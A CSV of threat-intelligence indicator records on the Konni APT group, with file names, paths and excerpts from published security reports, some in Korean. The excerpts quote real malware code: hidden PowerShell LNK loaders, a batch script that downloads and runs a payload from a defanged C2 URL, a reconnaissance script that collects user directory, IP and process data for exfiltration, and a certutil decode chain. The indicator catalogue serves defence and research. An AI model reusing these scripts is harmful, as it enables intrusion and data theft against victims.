1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:778fa575a2e9e8b4a23909edf50fbdfc4d00100de3c8f7ad280cb242210ecc32,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:80bfa9778cc0bed1cfd2e5e427c51749302645548eb901b79025cc48c575708a,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:b4efac2ddaf207383617e90b0046b9de2c9a2b385c3f46ef9af79b4171a9d16b,observation--sha256:528670ef284c6eaf9521cb04822d319add1904aef6dc3c0efc599efe0b702290,file-name,versioninfo.bat,versioninfo.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain versioninfo.bat The'versioninfo.bat' script playsapivotal roleintheoperation. It gathersdiverseinformationabout theuser'scomputer, suchasdirectorylistings, IPaddresses, runningprocesses, andsystemdetails, andthenexfiltratesthisdatawiththeassistanceof 'unactive.vbs,' whichwe'vepreviouslyanalyzed. Figure13- Attackchainendswithdataexfiltration MITREATT&CK TechniqueName TechniqueID Phishing:SpearphishingLink T1566.002CommandandScript",
1.0.0,actor--konni,artifact--sha256:f5ec93dd629e964ba95323646f8c6f02941aea39053aac487787b814975c6905,observation--sha256:35fb8e2928b013f84bcea0ae2f5eeb37a638c47138b3c0f3cba779a5cbcbd522,file-name,victory.exe,victory.exe,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TA406 has also used a version of Star (Figure 13) that is identical to a version that TA427 uses except for one small difference: the HTTP title in TA406’s version is “victory” while TA427’s is “star 3.0”. The “victory” keyword is notable due to several instances of the same or a similar word being used in activity that was publicly attributed by ESTsecurity to Konni Group and Kimsuky. For example, the actor that Proofpoint tracks as TA408 has used “victory” as a password for b374k web shells as",
1.0.0,actor--konni,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:d2bcaa8136e6c30291a79d3ed73d07af9cf2e7064df36a28cd80ba152f53b51f,file-name,wscript.exe,wscript.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 22 b. ‘start.vbs’ ○ 본 파일은 ZIP 파일이 풀린 후 가장 먼저 실행되는 파일로, Visual Basic Script 명령을 수행하게 됩니다. 파일명 start.vbs MD5 19ecb637cb3ba2660994eb87990c82d7 SHA1 cd81d310dd6b6029959e3c57dc11b751ab8220f4 SHA256 3c79f5bc1608f7582253cf201824d75d7c5cfbaa15334797 9e3ca701ceaefa20 [표 06] start.vbs 파일 HASH 정보 화면 ○ 파일 내부에는 다음과 같은 명령어를 가지고 있으며, 압축이 풀렸던 동일 경로의 ‘73888454.bat’ 배치 파일을 실행(Run)하는 명령을 수행하고 종료합니다. [그림 13] VBS 스크립트 내부 코드 화면 [그림 14] start.vbs 의 스크립트 코드를 실행시키기 위한 w",
1.0.0,actor--konni,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:46247aeb0a21717f49d427221d1dccafc52950a623baa6d862ff3bbb3192a139,file-name,wscript.exe,wscript.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:5cf6b998683aa9d42b21861818be220b6d5dff928d8e1b82575d4d07f583311c,file-name,wscript.exe,wscript.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:fcf0abc7e19120ce8ffe7a07ff548b27396418e8de19af71ba267d50e38cbfc1,observation--sha256:67bd50185094dbb3c91665f24d03e79687215dc4f620baaafdd077a4841ce19c,file-name,wupelv32.dll,wupelv32.dll,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:86540f196638e10b5f9267762c53c7f6178845d7a0234dd970125acd831a05a0,observation--sha256:6bd1f11d270bbfd24ef874c8c1c0eb4ed75e23db5e1951a09dffab0ad4115c52,file-name,wupelv64.dll,wupelv64.dll,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:6a0ee27f05eadd43e1cacd1613b0191b4ec4d66649ffece54d27cfd29d940199,observation--sha256:1c0453bdbcb80eebd212bb0eaa3a3da5d69434112bf5538c3342a4ef20cb2bfc,file-name,xlsx.lnk,xlsx.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 실제로 북한인권민간단체협의회(약칭 북인협 · NCNKHR) 의 창립총회 및 출범식은공격 이튿날 서울글로벌센터에서 진행됐습니다. 위협 행위자는 주요 행사 내용을활용해시의성있는맞춤형공격을휴일에수행한것입니다. 3 [그림2-2] 연합뉴스 TV방송화면(출처: 연합뉴스 TV유튜브) ○ 월요일 진행할 행사관계자들을타깃삼아일요일에해킹공격을수행한다는점은사이버 안보위협 전략분석 관점에서 나름시사하는바가있습니다. 주말공격에나선점은그만큼중요한작전임에틀림없습니다. ○ 전자우편에 첨부된 파일은 '230827-협의회 참여단체 현황. zip' 이름을 가지고있으며, 국내 특정 대학교에서 위탁 운영하는 육아종합지원센터로 연결돼 있습니다.공격자는해당웹서버를침해하여해킹중간거점으로악용했습니다. ○ 압축 파일 내부에는'230827- 협의회참여단체현황. xlsx.lnk' 이름의2중확장자파일이포함돼있습니다. 3 북한인권단체협의체첫출범…""정부의정책파트너"" / 연합뉴스 TV Ge",
1.0.0,actor--konni,artifact--sha256:6a0ee27f05eadd43e1cacd1613b0191b4ec4d66649ffece54d27cfd29d940199,observation--sha256:e8a69ba7b06a2319d38ac92588df57f499a9847ea4df133f99257169ab4219ab,file-name,xlsx.lnk,xlsx.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3. 위협분석(Threat Analysis)3.1. 북한인권민간단체협의회공지사칭■[사례A] 전자우편발신지및첨부파일주소분석 ○해당이메일의발신주소지와첨부파일의링크경로를조회해보면다음과같습니다.두곳모두한국의특정도메인과아이피주소가사용됐습니다. 발신지주소 첨부파일주소 도메인 아이피 국가 도메인 아이피 국가 pi.m2comm.co[.]kr 121.254.129.93 KR ddmccic.or[.]kr 116.122.157.24 KR [표3-1] 해킹용전자우편발신지및첨부파일링크정보 ○해당이메일의발신주소지와첨부파일의링크경로를조회해보면다음과같습니다.두곳모두한국의특정도메인과아이피주소가사용됐습니다. 본사례의발신지주소는과거부터피싱공격에악용된사례가다수목격된바있습니다. ■'230827- 협의회참여단체현황. xlsx.lnk' 악성파일분석 ○공격에사용된바로가기( LNK) 유형의악성파일은엑셀문서처럼위장하기위해2중확장자를가지고있고, 다음과같은정보로구성돼있습니다. 파일명 2",
1.0.0,actor--konni,artifact--sha256:47542d05d6d4f9ef4e694e51d6b32bedc13d26bbb52be21a517f9175694a6042,observation--sha256:bdd97585985687e1abbdb2257b0fdd46ee3465affce790c5333e198ac5235338,file-name,.zip)WScript.exeactivate.vbs,zip)WScript.exeactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:fdc5baa41c524444453d2b83e0dbe434941972989b0d4c64e85dd00d66abf7c2,observation--sha256:f6c2217faa1e2257f3653d6c3b777d808eb53cdb38be3ff0e24d2e93888e975e,file-path,%TEMP%\Log.%USERNAME%.bin  and prepended with the following two,%TEMP%\Log.%USERNAME%.bin and prepended with the following two,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable TA406 Malware YoreKey YoreKey is a simple Windows keylogger that stores its logs in a plain text file on the infected device. TA406 has used this malware since at least May 2020. The real name the developer(s) gave to this malware is unknown, so Proofpoint named it YoreKey after all C&C URLs have used the /history/ directory and the main purpose of the malware is to record keystrokes. The logs are stored using the following format: %TEMP%\Log.%USERNAME%.bin and prepended with the followi",
1.0.0,actor--konni,artifact--sha256:b6154899d69bcfe6bf6dce81de9ee677d5c2f85b36c16c2d15f52ae0c0660328,observation--sha256:c0452b07e416336d9148c5caaf0562ce7cfe201b70424b145a4932e1d7414b89,file-path,%temp%\230418.bat,%temp%\230418.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:b6154899d69bcfe6bf6dce81de9ee677d5c2f85b36c16c2d15f52ae0c0660328,observation--sha256:162b3d839159156d56d4add095009f523371f8e486000df9775286fa6472f341,file-path,%temp%\230418.bat,%temp%\230418.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:9899ac1bbd1e0c31cab8c566980c5847640b6547e931b4a584520df3e71f0df3,observation--sha256:4b693d53ac8b20455b7877575ba06612af8815ec622d2369aa04d57b0f677de4,file-path,%temp%\230419.hwp,%temp%\230419.hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:9899ac1bbd1e0c31cab8c566980c5847640b6547e931b4a584520df3e71f0df3,observation--sha256:aedf1975c54aa0e8254c78d266ec99f868915d21b008d551d6c583f154f158b8,file-path,%temp%\230419.hwp,%temp%\230419.hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:696c856c4dda4df7d1d017c59d45d49924077d076e915fac94cf5684de524802,observation--sha256:7936214e4304fbcfcebadc70d8123533d86c792479b783b834e233885415cfe0,file-path,%windir%\system32\cmd.exe’ 명령과 함께 별도의 인자가 실행되도록 구성되지만,%windir%\system32\cmd.exe’ 명령과 함께 별도의 인자가 실행되도록 구성되지만,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 12 03. 위협 분석 (Threat Analysis) a. ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ ○ ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 파일은 전형적인 LNK 유형의 악성 명령을 담고 있습니다. 우선 LNK 속성 정보 중 ‘대상’ 경로 앞단에 ‘%windir%\system32\cmd.exe’ 명령과 함께 별도의 인자가 실행되도록 구성되지만 화면상에 보이지는 않습니다. 그리고 ‘설명' 부분에는 마치 문서처럼 ‘hwp file’ 문구를 삽입한 것도 특징입니다. [그림 07] LNK 속성 정보 화면,
1.0.0,actor--konni,artifact--sha256:e6f57f70c708957497a7e16f3fc91dc99249a945a029a932169f9685bef660ad,observation--sha256:a1d32ba5a82d8f235af78f1074a469810688682ee1f6237ace4c26e04a41d456,file-path,C:\Program Files,C:\Program Files,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:185eba7fa2117e62d3314188f72ffded13a2f07dcd25b136277caf3ea03c5921,observation--sha256:f65fa2c77799c03d143f1af6c864fc3e4c6697773baec8f827eaf54b49cc0780,file-path,C:\Program Files\,C:\Program Files\,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:1c78172675d66964abada8a0b9c581975835003c5a9bcbbeecf5872cbae833fd,observation--sha256:371b6e5084d80db7fd4ca45a6ad0609140bd036fc55e8093102a5743dcaae0f1,file-path,C:\ProgramFiles (x86)\,C:\ProgramFiles (x86)\,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:09091abb93507bd9bb06bdb899c730e3e713acf0d53fc809e959d180c5bd31c1,observation--sha256:60f977af30033234ff0c0eca5b6cc4b5e145f2c3e74652daded15ec4f18b5b88,file-path,C:\ProgramFiles\,C:\ProgramFiles\,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:09777fe1d190408116c15af5832a3be675df91c2a974b98297834b47c00ab245,observation--sha256:101cd169392098c5c5e5f6b25f7f3ec6a1bc2c53f059580d92cf62c7d129024b,file-path,C:\Users\%username%\desktop,C:\Users\%username%\desktop,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:c590a8f257ca0a4239d66c18ae3eb3842201d13c4d334842fc3bc01dd1c8e1a6,observation--sha256:995ef6e66d08e12086647e1eff7c2f0473929eb267662338fda13b77ba09e936,file-path,C:\Users\%username%\desktop\/s,C:\Users\%username%\desktop\/s,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:cc3681c01df9ce4c13a47a9b78770afb0ea5ed49aaf595d79e30a60888888a2a,observation--sha256:4eb7260368e5fd18202ca7a42cc6ebfc5ce6e52151af5674ec2034635f1152af,file-path,C:\Users\%username%\docume,C:\Users\%username%\docume,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
